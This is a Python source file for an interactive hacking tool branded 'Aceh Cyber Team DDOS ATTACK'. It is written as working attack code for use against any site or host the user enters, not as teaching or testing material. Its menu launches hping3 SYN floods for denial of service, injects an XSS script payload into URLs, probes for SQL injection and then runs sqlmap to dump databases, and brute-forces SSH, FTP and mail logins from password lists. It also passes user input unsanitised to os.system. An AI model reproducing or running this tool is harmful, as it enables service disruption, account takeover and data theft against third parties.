# Create python3 
# Author Ro0T_N3T
# 
import urllib.request  as urllib2 
import re
import sys,os
import random

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'
 
def info():
	VERSION = B+'1.0'+E
	AUTHOR =  B+'Ro0T N3T'+E
	print("""
		#################################
		#                               # 
		#          Version-> %s        #
		#                               #
		#          Author->  %s     # 
		#                               #
		#################################
		""" % (VERSION, AUTHOR))
def heads():
	global head
	head = E+H+"""
###########################################
#             ACEH CYBER TEAM             #
#             $ DDOS ATTACK $             #
#             $ VERSION 1.0 $             #
###########################################\033[91m
# Github : https://github.com/rootnet007  #
#___________________ACT___________________#
+	  AUTHOR : Ro0T N3T                   +
+	  Code   : GR3G3T && MR.7u#h1         +
+	  Date   : 09/8/2018                  +
-------------------------------------------
"""+E
def banner():
	text1 = B+"""
###########################################
#             ACEH CYBER TEAM             #
#             $ DDOS ATTACK $             #
#             $ VERSION 1.0 $             #
###########################################
"""+F+'<<<<------'+W+'ACEH CYBER TEAM'+F+'---->>>>'+E
	text2 = O+"""
###########################################
#             ACEH CYBER TEAM             #
#             $ DDOS ATTACK $             #
#             $ VERSION 1.0 $             #
###########################################   
"""+F+'<<<<---------'+W+'Ro0T N3T'+F+'--------->>>>'+E+F+'\n 
<<<<--------'+W+'ACEH CYBER TEAM'+F+'-------->>>>'+E
	text3 = F+"""
###########################################
#             ACEH CYBER TEAM             #
#             $ DDOS ATTACK $             #
#             $ VERSION 1.0 $             #
###########################################
	"""+B+'Version ='+W+' 1.0'+E
	ran = random.randrange(1, 4)
	if ran == 1:
		print(text1)
	elif ran == 2:
		print(text2)
	elif ran == 3:
		print(text3)

def XXS():
	os.system('clear')
	banner()
	print('Enter site:')
	try:
		site = input(B+'hack»XXS»'+E) 
	except:
		print(F+'\nError'+E)
		
	if "http://" not in site and "https://"not in site:
		site = 'http://' + site
	else:
		pass

	if "id=" not in site:
		print(F+'[!]'+E+' Site dont have id parametrs')
	else:
		print(W+'[*]'+G+' Site '+site+' have "id" param')
	
	try:
		res = urllib2.urlopen(site)
	except:
		print(F+'[!] Site not work'+E)
		exit()
	
	try:
		print(W+'[+]'+G+' Site work'+E)
		scr = ';<script>alert(111111111111111111111);</script>'
		site_xxs = site+scr
		res = urllib2.urlopen(site_xxs)
		info = res.info()
		print('################Info################\n')
		print(info)
		print('####################################\n')
		text = res.read()

		if "111111111111111111111" not in str(text):
			print(F+'[!]'+' Site not have XXs '+E)
			exit()
		else:
			print(U+W+'[++]'+B+' Site '+site +' have xxs vulnerability'+E)
			print(W+'Payload: '+G+site_xxs+E)
			sys.exit(1)

	except:
		print(F+'[!]'+' Fatal Error'+E)
		exit()
def desc():
	print(W+''' 
  ____        ___ _____   _   _ __________
 |  _ \ ___  / _ \_   _| | \ | |___ /_   _|
 | |_) / _ \| | | || |   |  \| | |_ \ | |
 |  _  <(_) | |_| || |   | |\  |___) || |
 |_| \_\___/ \___/ |_|   |_| \_|____/ |_| 
 ___________________ACT____________________
'''+E)

def SQL():
	os.system('clear')
	banner()
	print(G+'Enter site:'+E)
	site = input(B+'Hunner»SqlScaner»'+E)
	if "http://" not in site and "https://"not in site:
		site = 'http://' + site
	else:
		pass
	if "id=" not in site:
		print(F+'[!]'+E+' Site dont have id parametrs')
	else:
		print(W+'[*]'+G+' Site '+site+' have "id" param')
	try:
		res = urllib2.urlopen(site)
		print(W+'[+]'+G+' Site work'+E)
	except:
		print(F+'[!]'+E+' Site dont work')
	try:
		info = res.info()
		print('#####################Info#####################')
		print(info)
		print('##############################################')
		bad_site = site+'\'\"'
		res = urllib2.urlopen(bad_site)
		text = res.read()
		if 'You have an error in your SQL syntax' not in str(text):
			print(W+'[--]'+F+' Site '+site+' not have Sql Error'+E)
		else:
			print(W+'[++]'+H+' Site '+F+site+H+' have SQL Error '+E)
			print('Start sqlmap ?')
			y = input('Y/n->')
			if y == "Y" or y == 'y':
				os.system('sqlmap -u '+site+' --dbs')
			else:
				print(W+'<< Good by >> '+E)
	except:
		print(F+'Fatal error'+E)


def Dos():
	os.system('clear')
	banner()
	print('Target Url:Contoh --> www.target.com')
	site = input(B+'Ro0T@N3T~:# '+E)
	print('''Serang Nomor ->> 1 atau 2)''')
	level = int(input(B+'Ro0T@N3T~:# '+E))
	if level == 3:
		os.system('hping3 -S -P --flood -V '+site)
	if level == 2:
		port = input(B+'Ro0T@N3T»Dos»Level»Port»'+E)
		os.system('hping3 -S -P --flood -V -p '+port+' '+ site)
	if level == 1:
		os.system('python3 AcehCyberTeam/act.py '+site)

def SSH_Brut():
	os.system('clear')
	banner()
	try:
		print(F+'Brutforse ssh mode!!'+E)
		print('Enter target host:')
		host = input(W+'Hunner»SSH»Host»'+E)
		print(G+'Enter username:'+E)
		print(G+'Default: admin'+E)
		user = input(W+'Hunner»SSH»User»'+E)
		if user == "":
			user = 'admin'
		print(G+'Enter password file:'+E)
		password = input(W+'Hunner»SSH»Password»'+E)

		if password == "":
			print('Enter password file')
			sys.exit(1)
		os.system('python3 modules/ssh.py '+host+' '+user+' '+password)
	except:
		print(F+' User aborting !!')
		exit()


def FTP_Brut():
	os.system('clear')
	banner()
	print(F+'Brutforse ftp mode!!'+E)
	print(B+'Enter host:'+E)
	host = input(W+'Hunner»Ftp»Host»'+E)
	print(B+'Enter user:'+E)
	print(F+'Default: admin')
	user = input(W+'Hunner»Ftp»User»'+E)
	print(B+'Enter password file:'+E)
	password_list = input(W+'Hunner»Ftp»Password»'+E)
	if user == '':
		user = 'admin'
	if password_list == '':
		print('Enter password list')
		sys.exit(1)
	os.system('python3 modules/ftp.py '+host+' '+user+' '+password_list)


def mail():
	os.system('clear')
	banner()
	print(H+'Brut mail account'+E)
	print(B+'Enter login:'+E)
	mail = input(W+'Hunner»Mail»Login»'+E)
	print(B+'Enter password list:'+E)
	password = input(W+'Hunner»Mail»Password»'+E)
	if password == '':
		print(F+'Password list: password/password_list.txt'+E)
		password = 'password/password_list.txt'
	os.system('python3 modules/mail.py '+mail+' '+password)

def Main_Menu():
	print(head)
	desc()
	print('\n')
	print(B+'''Masukan Angka -> (1) ?
'''+W+'''----------------------'''+E)
	try:
		v = input('Ro0T@N3T~:# ')
	except:
		print(' Good by ')
		exit()
	
	if v == 'help':
		info()
	elif int(v) == 4:
		XXS()
	elif int(v) == 2:
		SQL()
	elif int(v) == 1:
		Dos()
	elif int(v) == 3:
		FTP_Brut()
	elif int(v) == 5:
		SSH_Brut()
	elif int(v) == 6:
		mail()
	else:
		print(F+'[!]'+' You entered an incorrect value '+E)
		exit()
heads()
Main_Menu()
